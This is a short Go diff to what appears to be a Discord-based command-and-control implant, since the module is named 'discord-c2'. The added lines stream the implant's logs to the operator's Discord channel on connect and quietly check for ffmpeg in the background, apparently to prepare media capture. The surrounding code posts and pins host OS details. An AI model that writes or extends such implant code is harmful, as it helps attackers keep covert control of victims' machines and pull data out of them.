@@ -16,6 +16,7 @@ import (
 	"syscall"
 	"time"
 
+	"discord-c2/actions"
 	"github.com/bwmarrin/discordgo"
 )
 
@@ -413,6 +414,13 @@ func main() {
 		return
 	}
 	myChannelId = channelID
+	enableLogStreaming(dg, myChannelId)
+	log.Printf("log streaming enabled for channel %s on connect", myChannelId)
+
+	go func() {
+		log.Printf("checking ffmpeg availability on %s", runtime.GOOS)
+		actions.EnsureFFmpegAvailable(dg, myChannelId, nil)
+	}()
 
 	// Send first message with enhanced banner-style info (and pin it)
 	osLabel := ""
